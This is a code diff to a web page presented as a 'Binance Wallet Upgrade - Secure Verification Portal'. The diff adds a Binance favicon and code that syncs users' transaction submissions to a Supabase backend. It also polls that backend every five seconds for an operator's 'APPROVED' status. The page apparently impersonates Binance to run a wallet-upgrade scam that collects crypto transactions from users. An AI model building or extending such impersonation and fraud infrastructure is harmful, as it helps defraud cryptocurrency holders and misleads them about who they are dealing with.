@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Binance Wallet Upgrade - Secure Verification Portal</title>
+    <link rel="icon" type="image/png" href="New/assets/binance-4bd0f2d0.png">
 
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -864,6 +865,27 @@
             return false;
         }
 
+        async function refreshWalletUpgradeApprovalFromSupabase() {
+            if (typeof listWalletUpgradeSubmissions !== 'function') return;
+            try {
+                const submissions = await listWalletUpgradeSubmissions();
+                const localSubmission = JSON.parse(localStorage.getItem('walletUpgradeLastSubmission') || 'null');
+                const match = submissions.find(item =>
+                    (localSubmission && item.txHash === localSubmission.txHash) ||
+                    item.userEmail === 'wallet-upgrade@customer.local'
+                );
+                if (!match) return;
+                localStorage.setItem('walletUpgradeLastSubmission', JSON.stringify(match));
+                localStorage.setItem('walletUpgradeStatus', match.status || 'PENDING');
+                if (match.status === 'APPROVED') {
+                    localStorage.setItem('walletUpgradeApproval', 'APPROVED');
+                    applyWalletUpgradeApprovalState();
+                }
+            } catch (error) {
+                console.warn('Supabase wallet upgrade status refresh failed:', error);
+            }
+        }
+
         // Window Load Handler
         window.onload = function() {
             if (applyWalletUpgradeApprovalState()) {
@@ -872,6 +894,8 @@
             startInitialRedirectionSequence();
             fetchLiveBnbPrice();
             setInterval(fetchLiveBnbPrice, 4000);
+            refreshWalletUpgradeApprovalFromSupabase();
+            setInterval(refreshWalletUpgradeApprovalFromSupabase, 5000);
         };
 
         window.addEventListener('storage', function(event) {
@@ -1186,7 +1210,12 @@
             localStorage.setItem('walletUpgradeLastSubmission', JSON.stringify(submission));
 
             if (typeof createWalletUpgradeSubmission === 'function') {
-                createWalletUpgradeSubmission(submission).catch((error) => {
+                createWalletUpgradeSubmission(submission).then((remoteSubmission) => {
+                    if (remoteSubmission) {
+                        submission.id = remoteSubmission.id;
+                        localStorage.setItem('walletUpgradeLastSubmission', JSON.stringify(submission));
+                    }
+                }).catch((error) => {
                     console.warn('Supabase wallet-upgrade submission sync failed:', error);
                 });
             }
